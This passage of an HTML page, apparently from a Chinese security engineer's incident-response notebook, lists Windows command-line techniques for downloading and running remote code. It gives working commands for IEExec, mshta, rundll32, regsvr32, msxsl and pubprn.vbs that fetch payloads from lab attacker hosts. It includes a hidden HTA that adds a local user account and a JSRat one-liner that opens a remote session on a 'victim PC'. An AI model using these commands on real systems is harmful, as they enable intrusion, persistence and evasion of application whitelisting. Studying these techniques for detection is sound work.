+C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;IEExec.exe http://192.168.28.131/evil.exe
+</code></pre><p><img src="image/20200413-10.png" alt=""></p>
+<p><strong>11&#x3001;mshta</strong></p>
+<p>mshta&#x7528;&#x4E8E;&#x6267;&#x884C;.hta&#x6587;&#x4EF6;&#xFF0C;&#x800C;hta&#x662F;HTML Applocation &#x7684;&#x7F29;&#x5199;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;HTML&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;&#x800C;hta&#x4E2D;&#x4E5F;&#x652F;&#x6301;VBS&#x3002;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;hta&#x6765;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x3002;</p>
+<pre><code>mshta http://192.168.28.128/run.hta
+</code></pre><p>run.hta&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>&lt;HTML&gt; 
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+&lt;HEAD&gt; 
+&lt;script language=&quot;VBScript&quot;&gt;
+Window.ReSizeTo 0, 0
+Window.moveTo -2000,-2000
+Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+objShell.Run &quot;cmd.exe /c net user test password /add&quot; // &#x8FD9;&#x91CC;&#x586B;&#x5199;&#x547D;&#x4EE4;
+self.close
+&lt;/script&gt;
+&lt;body&gt;
+demo
+&lt;/body&gt;
+&lt;/HEAD&gt; 
+&lt;/HTML&gt;
+</code></pre><p><img src="image/20200413-11.png" alt=""></p>
+<p><strong>12&#x3001;rundll32</strong></p>
+<p>&#x5176;&#x5B9E;&#x8FD8;&#x662F;&#x4F9D;&#x8D56;&#x4E8E;WScript.shell&#x8FD9;&#x4E2A;&#x7EC4;&#x4EF6;&#xFF0C;&#x5728;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4F7F;&#x7528;JSRat&#x6765;&#x505A;&#x6F14;&#x793A;&#xFF0C;JSRat&#x662F;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x548C;&#x63A7;&#x5236;&#x6846;&#x67B6;&#xFF0C;&#x4EC5;&#x4E3A;rundll32.exe&#x548C;regsvr32.exe&#x751F;&#x6210;&#x6076;&#x610F;&#x7A0B;&#x5E8F;&#x3002;</p>
+<p>&#x9879;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/Hood3dRob1n/JSRat-Py.git" target="_blank">https://github.com/Hood3dRob1n/JSRat-Py.git</a></p>
+<p>&#x6B65;&#x9AA4;&#x4E00;&#xFF1A;&#x5F00;&#x59CB;&#x8FD0;&#x884C;JSRat&#xFF0C;&#x76D1;&#x542C;&#x672C;&#x5730;8888&#x7AEF;&#x53E3;&#x3002;</p>
+<p><img src="image/20200413-12-1.png" alt=""></p>
+<p>&#x6B65;&#x9AA4;&#x4E8C;&#xFF1A;&#x901A;&#x8FC7;url&#x8BBF;&#x95EE;&#xFF0C;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x3002;</p>
+<p><img src="image/20200413-12-2.png" alt=""></p>
+<p>&#x590D;&#x5236;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.28.131:8888/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}
+</code></pre><p>&#x6B65;&#x9AA4;&#x4E09;&#xFF1A;&#x5728;&#x53D7;&#x5BB3;&#x8005;PC&#x8FD0;&#x884C;&#x8BE5;&#x4EE3;&#x7801;&#xFF0C;&#x5C06;&#x6210;&#x529F;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A;</p>
+<p><img src="image/20200413-12-3.png" alt=""></p>
+<p><strong>13&#x3001;regsvr32 </strong></p>
+<p>Regsvr32&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x6CE8;&#x518C;COM&#x7EC4;&#x4EF6;&#xFF0C;&#x662F;Windows&#x7CFB;&#x7EDF;&#x63D0;&#x4F9B;&#x7684;&#x7528;&#x6765;&#x5411;&#x7CFB;&#x7EDF;&#x6CE8;&#x518C;&#x63A7;&#x4EF6;&#x6216;&#x8005;&#x5378;&#x8F7D;&#x63A7;&#x4EF6;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x4EE5;&#x547D;&#x4EE4;&#x884C;&#x65B9;&#x5F0F;&#x8FD0;&#x884C;</p>
+<p>&#x5728;&#x76EE;&#x6807;&#x673A;&#x4E0A;&#x6267;&#x884C;&#xFF1A;</p>
+<pre><code>regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll
+</code></pre><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x81EA;&#x5DF1;&#x6784;&#x9020;.sct&#x6587;&#x4EF6;&#xFF0C;&#x53BB;&#x4E0B;&#x8F7D;&#x6267;&#x884C;&#x6211;&#x4EEC;&#x7684;&#x7A0B;&#x5E8F;</p>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    progid=&quot;ShortJSRAT&quot;
+    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    &lt;script language=&quot;JScript&quot;&gt;
+        &lt;![CDATA[
+            ps  = &quot;cmd.exe /c calc.exe&quot;;
+            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);
+        ]]&gt;
+&lt;/script&gt;
+&lt;/registration&gt;
+&lt;/scriptlet&gt;
+</code></pre><p>&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x6210;&#x529F;&#x5F39;&#x8BA1;&#x7B97;&#x5668;&#xFF1A;</p>
+<p><img src="image/20200413-13.png" alt=""></p>
+<p><strong>14&#x3001;MSXSL.EXE</strong></p>
+<p>msxsl.exe&#x662F;&#x5FAE;&#x8F6F;&#x7528;&#x4E8E;&#x547D;&#x4EE4;&#x884C;&#x4E0B;&#x5904;&#x7406;XSL&#x7684;&#x4E00;&#x4E2A;&#x7A0B;&#x5E8F;&#xFF0C;&#x6240;&#x4EE5;&#x901A;&#x8FC7;&#x4ED6;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6267;&#x884C;JavaScript&#x8FDB;&#x800C;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;</p>
+<p>&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x4E3A;&#xFF1A;<a href="https://www.microsoft.com/en-us/download/details.aspx?id=21714" target="_blank">https://www.microsoft.com/en-us/download/details.aspx?id=21714</a></p>
+<p>msxsl.exe &#x9700;&#x8981;&#x63A5;&#x53D7;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;XML&#x53CA;XSL&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x8FDC;&#x7A0B;&#x52A0;&#x8F7D;&#xFF0C;&#x5177;&#x4F53;&#x65B9;&#x5F0F;&#x5982;&#x4E0B;&#xFF1A;</p>
+<pre><code>msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl
+</code></pre><p>demo.xml</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;exec.xsl&quot; ?&gt;
+&lt;customers&gt;
+&lt;customer&gt;
+&lt;name&gt;Microsoft&lt;/name&gt;
+&lt;/customer&gt;
+&lt;/customers&gt;
+</code></pre><p>exec.xsl</p>
+<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;
+&lt;xsl:stylesheet version=&quot;1.0&quot;
+xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;
+xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;
+xmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;
+
+&lt;msxsl:script language=&quot;JScript&quot; implements-prefix=&quot;user&quot;&gt;
+   function xml(nodelist) {
+var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c calc.exe&quot;);
+   return nodelist.nextNode().xml;
+
+   }
+&lt;/msxsl:script&gt;
+&lt;xsl:template match=&quot;/&quot;&gt;
+   &lt;xsl:value-of select=&quot;user:xml(.)&quot;/&gt;
+&lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre><p><img src="image/20200413-14.png" alt=""></p>
+<p><strong>15&#x3001;pubprn.vbs</strong></p>
+<p>&#x5728;Windows 7&#x4EE5;&#x4E0A;&#x7248;&#x672C;&#x5B58;&#x5728;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;PubPrn.vbs&#x7684;&#x5FAE;&#x8F6F;&#x5DF2;&#x7B7E;&#x540D;WSH&#x811A;&#x672C;&#xFF0C;&#x5176;&#x4F4D;&#x4E8E;C:\Windows\System32\Printing_Admin_Scripts\en-US&#xFF0C;&#x4ED4;&#x7EC6;&#x89C2;&#x5BDF;&#x8BE5;&#x811A;&#x672C;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x5176;&#x663E;&#x7136;&#x662F;&#x7531;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x8F93;&#x5165;&#xFF08;&#x901A;&#x8FC7;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#xFF09;&#xFF0C;&#x4E4B;&#x540E;&#x518D;&#x5C06;&#x53C2;&#x6570;&#x4F20;&#x9012;&#x7ED9;GetObject()</p>
+<pre><code>&quot;C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs&quot; 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct
+</code></pre><p>test.sct</p>
+<pre><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+&lt;scriptlet&gt;
+&lt;registration
+    description=&quot;Bandit&quot;
+    progid=&quot;Bandit&quot;
+    version=&quot;1.00&quot;
+    classid=&quot;{AAAA1111-0000-0000-0000-0000FEEDACDC}&quot;
+    remotable=&quot;true&quot;
+    &gt;
+&lt;/registration&gt;
+&lt;script language=&quot;JScript&quot;&gt;
+&lt;![CDATA[
+        var r = new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc.exe&quot;);
+]]&gt;
+&lt;/script&gt;
+&lt;/scriptlet&gt;
+</code></pre><p><img src="image/20200413-15.png" alt=""></p>
+<p>&#x53C2;&#x8003;&#x6587;&#x7AE0;&#xFF1A;</p>
+<p><a href="https://xz.aliyun.com/t/1654/" target="_blank">https://xz.aliyun.com/t/1654/</a></p>
+<p><a href="https://evi1cg.me/archives/remote_exec.html" target="_blank">https://evi1cg.me/archives/remote_exec.html</a></p>
+<p>&#x6536;&#x96C6;&#x6574;&#x7406;&#x7684;15&#x79CD;&#x6587;&#x4EF6;&#x4E0B;&#x8F7D;&#x7684;&#x65B9;&#x5F0F;</p>
+<p><a href="https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A" target="_blank">https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A</a></p>
+<p>Windows&#x6267;&#x884C;&#x547D;&#x4EE4;&#x4E0E;&#x4E0B;&#x8F7D;&#x6587;&#x4EF6;&#x603B;&#x7ED3; </p>
+<p> <a href="https://www.cnblogs.com/17bdw/p/8550189.html" target="_blank">https://www.cnblogs.com/17bdw/p/8550189.html</a></p>
+<p>&#x5728;windows&#x4E0A;&#x6267;&#x884C;&#x6076;&#x610F;&#x4EE3;&#x7801; by rundll32 &amp; regsvr32  </p>
+<p><a href="https://www.jianshu.com/p/e8f65deac245" target="_blank">https://www.jianshu.com/p/e8f65deac245</a></p>
+<p>IEexec.exe&#x6267;&#x884C;payload</p>
+<p><a href="https://www.codercto.com/a/104908.html" target="_blank">https://www.codercto.com/a/104908.html</a></p>
+<p>rundll32.exe &#x591A;&#x79CD;&#x65B9;&#x6CD5;&#x7ED5;&#x8FC7;&#x767D;&#x540D;&#x5355;</p>
+<p><a href="https://www.cnblogs.com/backlion/p/10488747.html" target="_blank">https://www.cnblogs.com/backlion/p/10488747.html</a></p>
+<pre><code>
+
+</code></pre>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="第4篇：Linux权限维持--后门篇.html" class="navigation navigation-prev " aria-label="Previous page: 第4篇：Linux权限维持--后门篇">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="第6篇：三大渗透测试框架权限维持技术.html" class="navigation navigation-next " aria-label="Next page: 第6篇：三大渗透测试框架权限维持技术">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"第5篇：Windows命令行文件下载方式汇总","level":"1.4.5","depth":2,"next":{"title":"第6篇：三大渗透测试框架权限维持技术","level":"1.4.6","depth":2,"path":"privilege/第6篇：三大渗透测试框架权限维持技术.md","ref":"privilege/第6篇：三大渗透测试框架权限维持技术.md","articles":[]},"previous":{"title":"第4篇：Linux权限维持--后门篇","level":"1.4.4","depth":2,"path":"privilege/第4篇：Linux权限维持--后门篇.md","ref":"privilege/第4篇：Linux权限维持--后门篇.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-sharing","back-to-top-button","splitter","chapter-fold","github","github-buttons","sharing-plus","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"chapter-fold":{},"github":{"url":"https://github.com/Bypass007/"},"livereload":{},"splitter":{},"search":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"back-to-top-button":{},"github-buttons":{"buttons":[{"user":"Bypass007","repo":"Emergency-Response-Notes","type":"star","size":"small","count":true}]},"sharing":{"qq":false,"all":["weibo","qq","qzone","douban","facebook","twitter","google"],"douban":false,"facebook":false,"weibo":true,"whatsapp":false,"line":false,"google":false,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","author":"Bypass","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"应急响应实战笔记","links":{"sharing":{"all":null,"facebook":null,"google":null,"twitter":null,"weibo":null}},"gitbook":"*","description":"应急响应实战笔记,一个安全工程师的自我修养。","extension":null},"file":{"path":"privilege/第5篇：Windows命令行文件下载方式汇总.md","mtime":"2020-06-13T13:41:58.057Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-06-13T18:17:20.376Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-chapter-fold/chapter-fold.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github-buttons/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
